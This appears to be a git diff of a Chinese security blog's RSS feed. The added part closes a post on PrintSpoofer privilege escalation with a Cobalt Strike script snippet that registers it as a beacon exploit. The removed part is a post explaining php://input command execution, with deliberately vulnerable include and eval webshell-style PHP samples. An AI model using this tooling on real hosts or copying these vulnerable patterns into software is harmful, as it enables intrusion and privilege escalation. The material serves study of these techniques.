+    bstage($1, $null, $2, $arch);
+}
+ 
+beacon_exploit_register(&quot;PrintSpoofer&quot;, &quot;PrintSpoofer local elecate privilege&quot;, &amp;amp;printspoofer);
+ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;生成DLL文件，调用脚本，依然是生效的&lt;/p&gt;
+
+&lt;p&gt;最终效果，很多cs插件没有集成这个PrintSpooler，Taowu插件集里有，其实现思路也如上，建议集成到自己的cs工具库上。有些情况下它比BadPotato等好用&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20230722015144155.png&quot; alt=&quot;image-20230722015144155&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;大致完。由于微软对SpoolSample给出的结论也是“预期行为”，理论上只要打印机后台服务程序启动，并且具有模拟特权，我们都能成功利用。So，利用前不妨&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ps | findstr &quot;spoolsv&quot;&lt;/code&gt;一下看看有没有打印机服务进程&lt;/p&gt;
+
+&lt;h1 id=&quot;learn-from&quot;&gt;Learn From&lt;/h1&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/#getting-a-system-token&quot;&gt;PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019 | itm4n’s blog&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://decoder.cloud/2019/03/06/windows-named-pipes-impersonation/&quot;&gt;Windows Named Pipes &amp;amp; Impersonation – Decoder’s Blog&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_36119192/article/details/112274131&quot;&gt;浅析Windows命名管道Named Pipe_named pipes_谢公子的博客&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.crisprx.top/archives/484#i-4&quot;&gt;PrintSpoofer提权原理探究 – Crispr –热爱技术和生活 (crisprx.top)&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Mon, 24 Jul 2023 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/potatoes%E5%AE%B6%E6%97%8F/2023/07/24/Windows%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A8%A1%E6%8B%9F%E5%92%8CPrintSpoofer%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6.html</link>
+        <guid isPermaLink="true">http://localhost:4000/potatoes%E5%AE%B6%E6%97%8F/2023/07/24/Windows%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A8%A1%E6%8B%9F%E5%92%8CPrintSpoofer%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6.html</guid>
+        
+        
+        <category>Potatoes家族</category>
+        
+      </item>
     
       <item>
         <title>红队邮差-邮件安全协议和Swaks伪造邮件</title>
@@ -2537,225 +3106,6 @@ namespace ChromeThief
         
         
         <category>NTLM</category>
-        
-      </item>
-    
-      <item>
-        <title>webshell分析————伪协议php://input命令执行的原理</title>
-        <description>&lt;h1 id=&quot;文前漫谈&quot;&gt;文前漫谈&lt;/h1&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;文章首发在Freebuf&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;研究几种webshell管理工具时遇见，发现几款常见的webshell管理工具都有对php://input的利用&lt;/p&gt;
-
-&lt;p&gt;本文记录我对php://input原理的学习和思考，如有疏漏失错，还请联系告知&lt;/p&gt;
-
-&lt;p&gt;$HTTP_RAW_POST_DATA的作用和php://input的作用相同，但是PHP 5.6.0. 被废弃了，后面的版本中就是用php://input替代。所有本文省略&lt;/p&gt;
-
-&lt;h1 id=&quot;官方文档的解释&quot;&gt;官方文档的解释&lt;/h1&gt;
-
-&lt;h2 id=&quot;_post数组&quot;&gt;$_POST数组&lt;/h2&gt;
-
-&lt;p&gt;当 HTTP POST 请求的 Content-Type 是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;application/x-www-form-urlencoded&lt;/code&gt;或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;multipart/form-data&lt;/code&gt;时，会将变量以关联数组形式传入当前脚本。&lt;/p&gt;
-
-&lt;h2 id=&quot;phpinput-伪协议&quot;&gt;php://input 伪协议&lt;/h2&gt;
-
-&lt;p&gt;php://input 是个可以访问请求的原始数据的只读流。当请求方式是post，并且Content-Type不等于&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;multipart/form-data&quot;&lt;/code&gt;时，可以使用php://input来获取原始请求的数据。&lt;/p&gt;
-
-&lt;h1 id=&quot;从post的几种content-type看php的_post-与-phpinput&quot;&gt;从POST的几种Content-Type看PHP的$_POST []与 php://input&lt;/h1&gt;
-
-&lt;p&gt;通常的，在php中我们用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$POST[]&lt;/code&gt;数组来处理封装好的POST请求正文中的内容，下面从http post上传时几种不同的表单编码格式分析$POST[]数组和php://input伪协议在处理post内容时的差别&lt;/p&gt;
-
-&lt;p&gt;POST表单上传时常见有这几种编码：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;multipart/form-data&lt;/li&gt;
-  &lt;li&gt;application/x-www-data-urlencoded&lt;/li&gt;
-  &lt;li&gt;application/json&lt;/li&gt;
-  &lt;li&gt;text/plain&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;multipartform-data-文件上传时的编码&quot;&gt;multipart/form-data (文件上传时的编码)&lt;/h2&gt;
-
-&lt;p&gt;服务端代码&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;enctype=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;multipart/form-data&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;file&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;upload_file&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;button&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Submit&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Submit&lt;span class=&quot;nt&quot;&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;_POST[]: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;php://input: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;php://input&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;上传 upload.txt , form表单如下，文件上传的post包就不多解释了&lt;/p&gt;
-
-&lt;p&gt;boundary=—-WebKitFormBoundaryHwjtGxAgxib9xeFe就是multipart分块传输的分界线&lt;/p&gt;
-
-&lt;p&gt;这个http包我精简过，注意Content-Type即可&lt;/p&gt;
-
-&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/test/demo.php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;192.168.1.136&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;398&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Cache-Control&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;max-age=0&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Origin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;http://192.168.1.136&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;multipart/form-data; boundary=----WebKitFormBoundaryHwjtGxAgxib9xeFe&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Referer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;http://192.168.1.136/test/demo.php&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip, deflate&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Accept-Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;en,zh-CN;q=0.9,zh;q=0.8&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
-
-------WebKitFormBoundaryHwjtGxAgxib9xeFe
-Content-Disposition: form-data; name=&quot;name&quot;
-
-123456
-------WebKitFormBoundaryHwjtGxAgxib9xeFe
-Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;upload.txt&quot;
-Content-Type: text/plain
-
-upload test
-------WebKitFormBoundaryHwjtGxAgxib9xeFe
-Content-Disposition: form-data; name=&quot;submit&quot;
-
-Submit
-------WebKitFormBoundaryHwjtGxAgxib9xeFe--
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;看见后端只有$POST[] 数组接收了form表单上传的内容，正如上面说的，当Content-Type: multipart/form-data;，php://input并不起作用&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/image-20230403225438175-1680843364971-1.png&quot; alt=&quot;image-20230403225438175&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;applicationx-www-data-urlencoded&quot;&gt;application/x-www-data-urlencoded&lt;/h2&gt;
-
-&lt;p&gt;服务端代码&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;enctype=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;application/x-www-data-urlencoded&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;button&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Submit&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Submit&lt;span class=&quot;nt&quot;&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;_POST[]: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;php://input: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;php://input&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;form表单的内容&lt;/p&gt;
-
-&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/test/demo.php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;192.168.1.136&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;23&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Cache-Control&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;max-age=0&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Origin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;http://192.168.1.136&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/x-www-form-urlencoded&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Referer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;http://192.168.1.136/test/demo.php&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip, deflate&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Accept-Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;en,zh-CN;q=0.9,zh;q=0.8&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
-
-name=demo&amp;amp;submit=Submit
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;$_POST[] 和 php://input都能接收到form表单的内容，也正如上面所说，php://input访问的时原始数据的只读流，后端接收到的和http传输的是相同的，但是解析的结果依然不同&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/image-20230403230323508.png&quot; alt=&quot;image-20230403230323508&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;这里我突发奇想看看试试如果url编码的结果是什么&lt;/p&gt;
-
-&lt;p&gt;把 ‘demo’ 进行再一次编码url全编码，相当于url二次编码了&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;demo
--&amp;gt;urlencode
-%31%32%37%2e%30%2e%30%2e%31
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/image-20230403231001651.png&quot; alt=&quot;image-20230403231001651&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;这里两者之间就有些差别了，具体原因就是浏览器发包时还会对post请求进行一次url编码，$_POST[]数组的内容是urldecode()之后的，而php://input访问的还是原始数据，也就没有解码&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/image-20230403233824446.png&quot; alt=&quot;image-20230403233824446&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;applicationjson&quot;&gt;application/json&lt;/h3&gt;
-
-&lt;p&gt;json格式通常在传输数据时使用，我直接在post包中发送json格式的数据了。其实理所应当的能想到$_POST[]数组是处理不了json格式的数据的，这种情况php只能用php://input读post的数据&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/image-20230403234723112.png&quot; alt=&quot;image-20230403234723112&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;总的来说&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;php://input会接收除了Content_Type: multipart/form-data情况下的内容&lt;/p&gt;
-
-  &lt;p&gt;而$_POST[]数组只处理类型为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;application/x-www-form-urlencoded&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;multipart/form-data&lt;/code&gt;的情况，因为只有这两种能被直接写成关联数组的形式（就是字典的形式）&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h2 id=&quot;phpinput-命令执行的原理&quot;&gt;php://input 命令执行的原理&lt;/h2&gt;
-
-&lt;p&gt;请求头中的Content-Type字段告诉服务器后端用户交互上传的是什么类型的数据，$_POST能处理form表单上传的键值对格式（类似字典）的内容，但是处理如上的json格式或者其他格式内容并不会生效。何况php的Content-Type类型且不止这三种&lt;/p&gt;
-
-&lt;p&gt;上面的三个例子也更好的说明了php://input是怎样和为什么要从原始数据的只读流处理post请求包的内容，但这不是php://input能进行命令执行的关键&lt;/p&gt;
-
-&lt;p&gt;它能进行命令执行的关键还是看它和什么函数联动，它本身并不能进行RCE，是处理php://input内容的函数出了问题&lt;/p&gt;
-
-&lt;p&gt;比如经典的远程文件包含&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;file&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;file接收php://input的内容，post body里就是完整的php文件内容，这里的关键就是include()函数，它会解析&amp;lt;?php标签，并把后面的代码当作php代码执行，直到读到?&amp;gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/image-20230404001117124.png&quot; alt=&quot;image-20230404001117124&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;或者说直接是&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;php://input&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;这种情况根据上面所说，直接在post body里输入php代码就行，连标签都不用加。（注意php://input和全局变量$_POST不同，它通常配合file_get_contents()函数使用）&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/image-20230404001948080.png&quot; alt=&quot;image-20230404001948080&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;比如冰蝎4的默认shell&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/image-20230404145214389.png&quot; alt=&quot;image-20230404145214389&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;完&quot;&gt;完&lt;/h1&gt;
-
-</description>
-        <pubDate>Fri, 07 Apr 2023 20:55:00 +0800</pubDate>
-        <link>http://localhost:4000/php/2023/04/07/%E4%BC%AA%E5%8D%8F%E8%AE%AEphp-input%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%8E%9F%E7%90%86.html</link>
-        <guid isPermaLink="true">http://localhost:4000/php/2023/04/07/%E4%BC%AA%E5%8D%8F%E8%AE%AEphp-input%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%8E%9F%E7%90%86.html</guid>
-        
-        <category>PHP</category>
-        
-        <category>php://input</category>
-        
-        
-        <category>PHP</category>
         
       </item>
     
